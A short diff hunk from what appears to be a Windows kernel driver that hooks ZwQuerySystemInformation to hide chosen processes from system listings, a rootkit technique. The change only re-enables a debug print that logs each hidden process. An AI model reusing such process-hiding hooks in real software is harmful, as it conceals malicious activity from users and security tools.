@@ -92,7 +92,7 @@ NTSTATUS newZwQuerySystemInformation(
 			//DbgPrint("ProcName:  %-20ws     pid:  %u\n", (*cSPI).ProcessName.Buffer, (*cSPI).UniqueProceessId);
 			//判断是否为需要隐藏的进程名
 			if (shouldHide(cSPI)) {
-				//DbgPrint("hide %-20ws\n", (*cSPI).ProcessName.Buffer);
+				DbgPrint("hide process %-20ws\n", (*cSPI).ProcessName.Buffer);
 				//当前的进程不是第一个  第一个进程时pSPI是NULL
 				if (pSPI != NULL) {
 					//当前进程是最后一个
